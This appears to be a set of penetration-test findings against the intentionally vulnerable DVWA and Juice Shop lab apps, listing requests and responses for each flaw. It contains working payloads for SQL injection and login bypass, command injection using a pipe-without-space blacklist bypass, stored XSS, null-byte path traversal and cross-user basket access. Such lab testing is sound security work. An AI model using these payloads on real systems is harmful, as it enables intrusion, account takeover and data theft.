findings.title: SQL Injection via session-stored id parameter at HIGH security (DVWA sqli)
request_sequence: POST http://dvwa/vulnerabilities/sqli/session-input.php  form_data={id: "1' OR '1'='1' #", Submit: Submit}  -> 200, session echoes 'Session ID: 1' OR '1'='1' #'
GET http://dvwa/vulnerabilities/sqli/ (dvwa_admin session, no query params) -> 200, 5 records returned
POST http://dvwa/vulnerabilities/sqli/session-input.php form_data={id: "1' AND '1'='2' #", Submit: Submit} -> 200, session echoes 'Session ID: 1' AND '1'='2' #'
GET http://dvwa/vulnerabilities/sqli/ (dvwa_admin session, no query params) -> 200, 0 records returned
findings.response_evidence: [security=high] Payload TRUE: 1' OR '1'='1' # ; Payload FALSE: 1' AND '1'='2' #. At high security, the id parameter is not accepted directly via query string on /vulnerabilities/sqli/ (page shows only a 'Click here to change your ID' link); instead it must be POSTed out-of-band to /vulnerabilities/sqli/session-input.php, which stores it in the PHP session (confirmed by page echo 'Session ID: ...'), and the subsequent GET /vulnerabilities/sqli/ (no query params) uses the stored session value to run the query with an appended LIMIT 1, requiring the trailing '#' comment to neutralize it. TRUE payload returned 5 full records (seeded users): ID 1' OR '1'='1' # First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE payload returned zero records (page body contained only the 'Click here to change your ID' link, no pre blocks). Page footer on both requests confirms 'Security Level: high'. This demonstrates classic boolean-based SQL injection bypassing the high-security out-of-band/session-stored id handling.

findings.title: OS Command Injection via ip parameter at HIGH security (DVWA exec) using pipe without trailing space
request_sequence: POST http://dvwa/vulnerabilities/exec/ (dvwa_admin session) form_data={ip: "127.0.0.1|whoami", Submit: Submit} -> 200
findings.response_evidence: [security=high] Payload: 127.0.0.1|whoami (pipe with NO trailing space, bypassing the high-security blacklist which strips '; ', '| ' (pipe+space), and '&&'). Response page visible_text contains the ping output followed directly by the injected command's output: 'Enter an IP address: www-data' and the response's pre_blocks field explicitly contains ["www-data"], confirming the whoami command executed server-side and returned the web process identity. Page footer confirms 'Security Level: high'. This proves the high-security blacklist is bypassed by omitting the trailing space after the pipe character.

findings.title: Stored XSS via mtxMessage field (script tag not sanitized) at medium security
request_sequence: POST /vulnerabilities/xss_s/ with form_data {txtName: 'tester2', mtxMessage: '<script id="test_token">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'}
browser_navigate http://dvwa/vulnerabilities/xss_s/ (dvwa_admin session)
browser_eval_js('window.xss_flag')
browser_read_dom('#test_token')
findings.response_evidence: [security=medium] After submitting the canary payload into mtxMessage (maxlength=50, payload fits exactly), the guestbook entry for 'tester2' was stored and rendered. On reload via browser_navigate, browser_eval_js('window.xss_flag') returned 1, and browser_read_dom('#test_token') found the element with inner_text 'window.xss_flag=1', proving the injected <script id="test_token"> tag was stored verbatim (not stripped by DVWA's medium-level filter, which in this build only sanitizes txtName via strip_tags, not mtxMessage) and executed in the authenticated admin browser context. Page banner confirmed 'Security Level: medium'.

findings.title: SQL Injection via POST id parameter (numeric boolean bypass) at medium security
request_sequence: POST /vulnerabilities/sqli/ with form_data {id: '1 OR 1=1', Submit: 'Submit'}
POST /vulnerabilities/sqli/ with form_data {id: '1 AND 1=2', Submit: 'Submit'}
findings.response_evidence: [security=medium] TRUE payload id='1 OR 1=1' returned 5 seeded user records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith). FALSE payload id='1 AND 1=2' returned zero records (only the dropdown, no 'ID:' result blocks). This confirms the id POST parameter is concatenated unescaped as a numeric value into the SQL query (quotes are escaped via mysqli_real_escape_string at medium, but numeric injection bypasses that escaping). Security level banner on page confirmed 'Security Level: medium' throughout.

findings.title: Cross-User Basket Access (BOLA) via /rest/basket/{id} — acct2 can read acct1's basket
request_sequence: GET http://juiceshop:3000/rest/basket/6  (session=juiceshop_acct1, own basket)
GET http://juiceshop:3000/rest/basket/6  (session=juiceshop_acct2, cross-user access attempt)
findings.response_evidence: As juiceshop_acct1 (own_basket_id=6), GET /rest/basket/6 returned HTTP 200 with data: {id:6, UserId:22, Products:[{name:'Apple Juice (1000ml)', BasketItem:{BasketId:6, id:9, quantity:3}}]}. As juiceshop_acct2 (own_basket_id=7, a DIFFERENT basket), issuing GET /rest/basket/6 (acct1's basket ID, not acct2's own) ALSO returned HTTP 200 with the IDENTICAL data: {id:6, UserId:22, Products:[{name:'Apple Juice (1000ml)', BasketItem:{BasketId:6, id:9, quantity:3}}]} — i.e. acct2's JWT session successfully retrieved acct1's distinct seeded item (Apple Juice (1000ml), quantity 3) despite belonging to a different user (UserId:22 belongs to acct1, not acct2). No server-side ownership/authorization check was enforced on this endpoint, confirming Broken Object Level Authorization (BOLA).

findings.title: Confidential Document Exposure via Open Directory Listing on /ftp/
request_sequence: GET http://juiceshop:3000/ftp/  Accept: text/html,application/json  (session=unauth)
GET http://juiceshop:3000/ftp/acquisitions.md  (session=unauth)
findings.response_evidence: GET /ftp/ (unauthenticated, Accept: text/html,application/json) returned HTTP 200 with an open directory listing (serve-index) exposing files including acquisitions.md (909 bytes), announcement_encrypted.md, coupons_2013.md.bak, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml, among others — all without requiring authentication. Direct retrieval GET /ftp/acquisitions.md returned HTTP 200, content-type text/markdown, with body containing the confidential memo: '# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year...'. This confirms both the open directory listing (CWE-200 information exposure) and successful unauthenticated retrieval of a document explicitly marked confidential.

findings.title: Authentication Bypass via SQL Injection on /rest/user/login
request_sequence: POST http://juiceshop:3000/rest/user/login  (session=unauth)  JSON body: {"email": "' OR 1=1--", "password": "anything"}
findings.response_evidence: POST /rest/user/login with JSON body {email: \"' OR 1=1--\", password: [REDACTED]"anything\"} (unauthenticated, no valid credentials for any account) returned HTTP 200 with body: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The response contains a valid authentication token (JWT) along with umail=\"admin@juice-sh.op\", confirming the SQL injection payload in the email field bypassed authentication entirely (the raw SQL WHERE clause became effectively `email='' OR 1=1--' AND password=[REDACTED], matching the first row in the Users table, which is the admin account) and the server issued a fully valid session token for that user without knowing the real password.

findings.title: Poison Null-Byte Path Traversal bypasses .bak file extension filter in /ftp/
request_sequence: GET http://juiceshop:3000/ftp/package.json.bak -> HTTP 403 'Error: Only .md and .pdf files are allowed!' (thrown by verify() in fileServer.js:55)
GET http://juiceshop:3000/ftp/package.json.bak%2500.md -> HTTP 200, content-type application/octet-stream, body is the full contents of package.json (name: juice-shop, version, dependencies, etc.)
findings.response_evidence: Raw request to /ftp/package.json.bak returned HTTP 403 with body: "Error: Only .md and .pdf files are allowed! ... at verify (/juice-shop/build/routes/fileServer.js:55:18)". The same restricted file requested with a URL-encoded null byte followed by an allowed extension, /ftp/package.json.bak%2500.md, returned HTTP 200 with the actual package.json file content served verbatim (JSON starting with {"name": "juice-shop", "version": "6.2.0-SNAPSHOT", ...}), proving the extension-allowlist regex check is bypassed by the poison null byte and the restricted .bak file is disclosed.

findings.title: Exposed Encryption Keys Directory via open directory listing
request_sequence: GET http://juiceshop:3000/encryptionkeys/ with Accept: text/html,application/json (unauth) -> HTTP 200 serve-index directory listing containing links to jwt.pub (248B) and premium.key (50B)
findings.response_evidence: Unauthenticated GET /encryptionkeys/ returned HTTP 200 with a browsable directory listing (serve-index) whose visible_text was: "listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM" and included direct links to http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key. This confirms the encryption-keys directory is openly browsable without authentication and exposes sensitive key filenames (JWT public key and premium feature key).

findings.title: Product-Search SQL Injection via unsanitized 'q' parameter
request_sequence: GET http://juiceshop:3000/rest/products/search?q=qwert%27 (unauth) -> HTTP 500 SQLITE_ERROR
GET http://juiceshop:3000/rest/products/search?q=x%27%29%29%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9-- (unauth) -> HTTP 200 success JSON with injected literal columns
findings.response_evidence: Request 1: GET /rest/products/search?q=qwert' returned HTTP 500 with body: 'Error: SQLITE_ERROR: near "\'%\'": syntax error', proving the q parameter is concatenated directly into a raw SQL LIKE query without sanitization. Request 2: GET /rest/products/search?q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- returned HTTP 200 with JSON body {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]} — the returned record's fields are literally the integers 2-9 injected via the UNION SELECT rather than real product data, conclusively demonstrating successful SQL injection/UNION-based query manipulation.

findings.title: Unauthenticated disclosure of user feedback records including partially-masked author email addresses and UserId linkage via /api/Feedbacks
request_sequence:
GET http://juiceshop:3000/api/Feedbacks HTTP/1.1
Accept: application/json
(no Authorization header, no session cookie - unauth session)
findings.response_evidence:
HTTP 200 application/json response returned a full array of 8 feedback records with NO authentication required. Records include a 'UserId' field directly linking feedback to specific user account IDs (1, 2, 3, 21) plus embedded partially-masked email addresses inside the comment text that were auto-appended by the client when the feedback was originally submitted by authenticated users:
- UserId:1, id:1 -> comment: \"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\"
- UserId:2, id:2 -> comment: \"Great shop! Awesome service! (***@juice-sh.op)\"
- UserId:3, id:3 -> comment: \"Nothing useful available here! (***der@juice-sh.op)\"
- UserId:21, id:4 -> comment: \"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : ... (***ereum@juice-sh.op)\"
Remaining records (id 5-8) have UserId:null and show '(anonymous)' confirming that for logged-in submitters the endpoint discloses (a) the numeric UserId of the author and (b) a partially redacted email address/domain embedded in the publicly-readable comment, all retrievable by a fully unauthenticated client. This confirms CWE-359 (exposure of private/personal information to an unauthorized actor) since no Authorization header or session cookie was sent and the API still returned the full dataset including PII-correlatable fields (UserId + partial email) for all users, not just the requester.
